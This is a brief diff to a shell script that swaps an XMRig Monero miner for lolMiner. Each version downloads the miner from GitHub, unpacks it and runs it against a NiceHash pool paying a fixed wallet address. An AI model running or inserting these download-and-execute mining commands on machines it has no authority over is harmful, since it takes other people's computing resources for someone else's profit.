@@ -1,3 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz 
-tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0; clear 
-./xmrig --donate-level 1 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 3QAbQX6ggoZ8MXrQMpuGkr4AFfdpdpfo3G.VEXOR -k -a rx/0 -t 2
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz && tar -xf lolMiner_v1.51_Lin64.tar.gz && cd 1.51 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 -u 3QAbQX6ggoZ8MXrQMpuGkr4AFfdpdpfo3G.VEXOR
